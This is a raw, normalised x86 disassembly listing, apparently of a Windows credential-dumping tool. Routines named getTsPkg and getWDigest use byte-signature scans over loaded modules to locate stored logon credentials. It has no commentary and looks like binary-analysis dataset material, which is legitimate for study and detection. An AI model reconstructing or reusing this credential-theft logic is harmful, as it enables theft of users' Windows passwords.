cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov [ eax ] 0x0
pop ebp
retn 0x4
mov eax [ esi ]
mov [ eax ] 0x0
mov eax esi
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov cl [ ebp + 0x8 ]
mov eax esi
mov [ eax ] cl
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop ebp
retn 0x4
movsx edx [ ebp + 0x8 ]
push edi
push edx
push eax
call sub_1001b6e0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10013880
push ebp
mov ebp esp
push ecx
mov edx [ ecx ]
xor eax eax
push esi
lea esi [ ebx + 0x4 ]
mov [ ebx ] edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ ebp - 0x4 ] eax
mov [ esi ] ax
call sub_10001bb0
mov eax ebx
pop esi
mov esp ebp
pop ebp
retn
sub_100138b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100285b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_100163b9
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100163b9
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_100163e1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001608f
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100163e1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10013ca0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_100163b9
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10016fc1
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10017df7
lea ecx [ ebp - 0x14 ]
call sub_100163e1
push esi
call sub_10016018
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_100139f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028718
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
movzx edx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x48 ] ecx
xor ebx ebx
mov edi 0x2
xor ecx ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x44 ] edi
cmp dx bx
je r-xdata
push ebx
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_100137c0
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x34 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
mov eax edx
lea ecx [ ecx ]
xor ebx ebx
xor esi esi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x3c ] esi
cmp [ ebp - 0x44 ] ebx
jbe r-xdata
movzx eax [ esi + ecx * 2 + 0x2 ]
inc ecx
cmp ax bx
jne r-xdata
inc edi
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov edx [ ebp + 0xc ]
movzx eax [ edx + ebx * 2 ]
test ax ax
je r-xdata
cmp ax dx
jne r-xdata
mov [ ebp - 0x44 ] edi
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_100173b1
add esp 0x4
mov edi [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
movzx ecx [ edx ]
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ edx + ebx * 2 + 0x2 ]
inc ebx
test ax ax
jne r-xdata
mov ecx [ ebp - 0x38 ]
add ebx ecx
movzx eax [ edx + ebx * 2 ]
cmp ax [ edx ]
je r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp ax cx
je r-xdata
cmp ecx 0x7f
jb r-xdata
test ax ax
je r-xdata
movsx edx [ eax + esi ]
add ebx edx
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
mov ecx 0x7f
mov edi [ ebp - 0x48 ]
mov esi [ ebp - 0x40 ]
call sub_10013d60
test al al
jne r-xdata
inc esi
mov [ ebp - 0x3c ] esi
cmp esi [ ebp - 0x44 ]
jb r-xdata
mov [ eax + esi ] cl
mov [ ebp - 0x34 ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
cmp ecx 0x7f
jb r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx 0x7f
mov edx [ ebp + 0xc ]
mov ax [ edx + ebx * 2 ]
cmp ax [ esi + 0x6 ]
jne r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov edi [ ebp - 0x48 ]
mov esi [ ebp - 0x40 ]
call sub_10013d60
test al al
jne r-xdata
mov edx [ ebp - 0x3c ]
mov [ eax + edx ] cl
mov esi edx
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov esi [ ebp - 0x3c ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov [ esi ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ esi ]
inc [ ebp - 0x38 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
mov [ ebp - 0x34 ] 0xffffffff
jmp r-xdata
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x34 ] 0xffffffff
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_10013c60
cmp eax edi
je r-xdata
retn
push esi
lea esi [ eax + 0x18 ]
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] 0x0
mov [ esi - 0x14 ] cx
add esi 0x20
lea edx [ esi - 0x18 ]
cmp edx edi
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_100173b1
add esp 0x4
cmp [ esi ] 0x8
jb r-xdata
pop esi
sub_10013ca0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002858b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi ] ebx
jne r-xdata
push 0x10
call sub_1001740d
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edi [ eax + 0x18 ]
cmp edi ebx
jne r-xdata
lea edx [ ebp - 0x34 ]
push edx
call sub_10002d70
lea ecx [ ebp - 0x34 ]
push ecx
call sub_10002cd0
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10015e4c
mov edi [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
lea edi [ eax + 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] esi
test bl 0x1
je r-xdata
sub_10013d60
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov [ esi ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ edi ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ edi + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ esi + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ edi + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_10013e10
push ebp
mov ebp esp
push 0xffffffff
push sub_10029061
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
lea edi [ eax + 0x18 ]
lea esi [ ecx + 0x14 ]
nop
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
add eax 0x20
add esi 0x20
mov [ ebp + 0xc ] eax
add edi 0x20
jmp r-xdata
mov edx [ esi - 0x14 ]
mov [ eax ] edx
xor ecx ecx
lea ebx [ edi - 0x14 ]
mov [ edi ] 0x7
mov [ edi - 0x4 ] 0x0
mov [ ebx ] cx
lea edx [ esi - 0x10 ]
lea ecx [ edi - 0x14 ]
cmp ecx edx
je r-xdata
lea ecx [ esi - 0x14 ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
cmp [ edi ] 0x8
jb r-xdata
xor ecx ecx
xor edx edx
mov [ edi ] 0x7
mov [ edi - 0x4 ] ecx
mov [ ebx ] dx
cmp [ esi + 0x4 ] 0x8
jae r-xdata
mov eax [ ebx ]
push eax
call sub_100173b1
mov eax [ ebp + 0xc ]
add esp 0x4
mov edx [ esi - 0x10 ]
mov [ ebx ] edx
mov [ esi - 0x10 ] ecx
mov eax [ esi ]
inc eax
add eax eax
push eax
lea ecx [ esi - 0x10 ]
push ecx
push ebx
call sub_10017050
mov eax [ ebp + 0xc ]
add esp 0xc
jmp r-xdata
mov ecx [ esi ]
mov [ edi - 0x4 ] ecx
mov edx [ esi + 0x4 ]
mov [ edi ] edx
xor ecx ecx
mov [ esi + 0x4 ] 0x7
mov [ esi ] 0x0
mov [ esi - 0x10 ] cx
sub_10013f10
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
mov [ ebp - 0x10 ] 0x8b55ff8b
mov [ ebp - 0xc ] 0x60ec83ec
mov [ ebp - 0x8 ] 0x5653
mov [ ebp - 0x6 ] 0x57
jne r-xdata
call sub_10014f80
test al al
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0xc
lea ecx [ ebp - 0x20 ]
push ecx
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
push edi
push 0x1
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x20 ]
add ecx eax
push ecx
push eax
mov edi 0xb
mov [ ebp - 0x14 ] 0x0
call sub_10002ba0
add esp 0x14
pop edi
test al al
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ rw-data ] edx
getTsPkgFunctions
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9c
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
call sub_1000d200
call sub_10013f10
test al al
mov eax r--data
jne r-xdata
push eax
push ecx
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov bl 0x6
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x2c ]
mov [ esp + 0x28 ] esp
call sub_1000d2e0
mov ecx [ ebp + 0x8 ]
call sub_10001850
mov edx [ esp + 0x2c ]
mov bl al
mov eax [ edx + 0x4 ]
add esp 0x1c
lea ecx [ esp + 0x14 ]
mov [ esp + eax + 0x10 ] r--data
call sub_10003fa0
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x60 ]
mov [ esp + edx + 0x10 ] r--data
push eax
mov [ esp + 0x64 ] r--data
call sub_10015fc5
add esp 0x4
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_100033b0
or eax 0x4
getTsPkg
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
xor esi esi
push edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ecx
xor edx edx
push 0x5
mov eax r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x20 ] sub_10014320
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] esi
mov [ esp + 0x34 ] dx
call sub_10001f10
lea edi [ esp + 0x30 ]
lea ecx [ esp + 0x1c ]
lea ebx [ esp + 0x4c ]
call sub_10013880
mov ecx eax
lea ebx [ esp + 0x20 ]
call sub_10010120
mov edi 0x8
cmp [ esp + 0x64 ] edi
jb r-xdata
xor ecx ecx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] esi
mov [ esp + 0x50 ] cx
cmp [ esp + 0x44 ] edi
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_10015330
mov ebx [ esp + 0x24 ]
add esp 0x4
mov [ esp + 0x13 ] al
cmp ebx esi
je r-xdata
mov edx [ esp + 0x30 ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edi [ esp + 0x24 ]
mov eax ebx
call sub_10013c60
push ebx
call sub_100173b1
mov al [ esp + 0x17 ]
add esp 0x4
sub_10014320
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10029573
mov eax [ fs : 0x0 ]
push eax
sub esp 0x100
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xf8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x110 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
call sub_10013f10
test al al
je r-xdata
sub esp 0x1c
mov ecx esp
xor edx edx
mov [ esp + 0x30 ] esp
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] dx
push 0xf
mov eax r--data
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
xor ebx ebx
push esi
mov [ esp + 0x20 ] ebx
call [ rw-data ]
test eax eax
js r-xdata
call sub_10001f10
mov ecx [ ebp + 0xc ]
call sub_10001850
add esp 0x1c
jmp r-xdata
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x30 ] esp
mov [ ecx ] ax
push 0xe
mov eax r--data
mov eax [ esp + 0x18 ]
cmp [ eax + 0x50 ] ebx
je r-xdata
mov ecx [ esp + 0x110 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xf8 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0xc
sub esp 0x1c
mov ecx esp
xor edx edx
mov [ esp + 0x30 ] esp
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
push 0xf
mov eax r--data
jmp r-xdata
mov edi [ eax + 0x50 ]
lea ecx [ esp + 0xec ]
add edi 0x14
push ecx
call sub_10015030
add esp 0x4
xor edx edx
mov [ esp + 0x118 ] ebx
cmp [ ebp + 0x10 ] bl
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x50 ]
movzx ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
shr ecx 0x1
push ecx
mov esi 0x7
lea ecx [ esp + 0xd4 ]
mov [ esp + 0xe8 ] esi
mov [ esp + 0xe4 ] ebx
mov [ esp + 0xd4 ] dx
call sub_10001f10
mov [ esp + 0x118 ] 0x1
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x50 ]
movzx ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
shr ecx 0x1
xor edx edx
push ecx
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xcc ] esi
mov [ esp + 0xc8 ] ebx
mov [ esp + 0xb8 ] dx
call sub_10001f10
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x11c ] 0x2
call sub_1000d200
push 0xa
lea ecx [ esp + 0x20 ]
mov [ esp + 0x11c ] 0x3
call sub_1000d080
mov ecx [ esp + 0x1c ]
mov eax [ ecx + 0x4 ]
mov ecx [ esp + eax + 0x28 ]
xor esi esi
test cl 0x6
jne r-xdata
sub esp 0x1c
mov edi esp
mov [ esp + 0x30 ] esp
push ebx
lea eax [ esp + 0x10c ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
or eax 0xffffffff
mov [ edi ] dx
call sub_10001db0
mov ecx [ ebp + 0xc ]
call sub_10001850
add esp 0x1c
mov bl al
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov ecx [ ecx + 0x4 ]
lea ecx [ esp + ecx + 0x1c ]
cmp esi ebx
je r-xdata
mov eax [ esp + eax + 0x54 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x100 ] 0x8
jb r-xdata
lea edx [ esp + 0xd0 ]
push edx
push ecx
lea eax [ esp + 0x24 ]
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov al bl
mov eax [ esp + 0xec ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
lea edx [ esp + 0xb4 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
lea edx [ esp + 0xec ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
sub esp 0x14
mov esi esp
lea eax [ esp + 0x38 ]
mov [ esp + 0x30 ] esp
call sub_1000d2e0
mov ecx [ ebp + 0xc ]
call sub_10001850
add esp 0x1c
lea ecx [ esp + 0x1c ]
mov bl al
mov [ esp + 0x118 ] 0x2
call sub_10008a40
lea esi [ esp + 0xb4 ]
call sub_10001af0
lea esi [ esp + 0xd0 ]
call sub_10001af0
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
call sub_100033b0
or eax 0x4
sub_100146e0
push ebp
mov ebp esp
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
mov [ ebp - 0xc ] 0x8908458b
mov [ ebp - 0x8 ] 0x440c708
jne r-xdata
call sub_10014f80
test al al
je r-xdata
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
push 0x11c
lea edx [ ebp - 0x128 ]
push 0x0
push edx
call sub_1001b6e0
add esp 0xc
lea eax [ ebp - 0x128 ]
push eax
mov [ ebp - 0x128 ] 0x11c
call [ GetVersionExW@IAT ]
pop edi
test eax eax
je r-xdata
push esi
push r--data
push edi
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x124 ]
cmp eax 0x5
jne r-xdata
pop esi
push 0xc
lea eax [ ebp - 0x138 ]
push eax
push edi
call [ GetCurrentProcess@IAT ]
push eax
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ ebp - 0x120 ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x138 ]
push 0x0
lea ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xc ]
push edx
push eax
push esi
mov edi 0x8
mov [ ebp - 0x12c ] 0x0
call sub_10002ba0
add esp 0x14
test al al
je r-xdata
mov [ rw-data ] 0x20
cmp eax 0x2
jne r-xdata
mov [ rw-data ] 0x24
jmp r-xdata
mov eax [ ebp - 0x12c ]
mov ecx [ eax - 0x4 ]
mov [ rw-data ] ecx
mov [ rw-data ] 0x1c
jmp r-xdata
getWDigest
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
xor esi esi
push edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ecx
xor edx edx
push 0x7
mov eax r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x20 ] sub_10014b80
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] esi
mov [ esp + 0x34 ] dx
call sub_10001f10
lea edi [ esp + 0x30 ]
lea ecx [ esp + 0x1c ]
lea ebx [ esp + 0x4c ]
call sub_10013880
mov ecx eax
lea ebx [ esp + 0x20 ]
call sub_10010120
mov edi 0x8
cmp [ esp + 0x64 ] edi
jb r-xdata
xor ecx ecx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] esi
mov [ esp + 0x50 ] cx
cmp [ esp + 0x44 ] edi
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_10015330
mov ebx [ esp + 0x24 ]
add esp 0x4
mov [ esp + 0x13 ] al
cmp ebx esi
je r-xdata
mov edx [ esp + 0x30 ]
push edx
